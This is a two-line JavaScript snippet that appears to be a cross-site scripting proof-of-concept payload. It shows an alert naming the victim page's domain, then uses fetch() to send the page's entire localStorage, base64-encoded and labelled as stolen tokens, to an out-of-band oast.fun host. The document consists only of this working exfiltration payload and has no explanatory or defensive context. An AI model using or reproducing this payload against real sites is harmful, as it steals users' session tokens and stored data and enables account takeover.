
   alert("RCE on " + document.domain);
   fetch("https://azkbnvhomenbydebfhuaw19v2ncab3x82.oast.fun/steal?tokens=" + btoa(JSON.stringify(localStorage)));
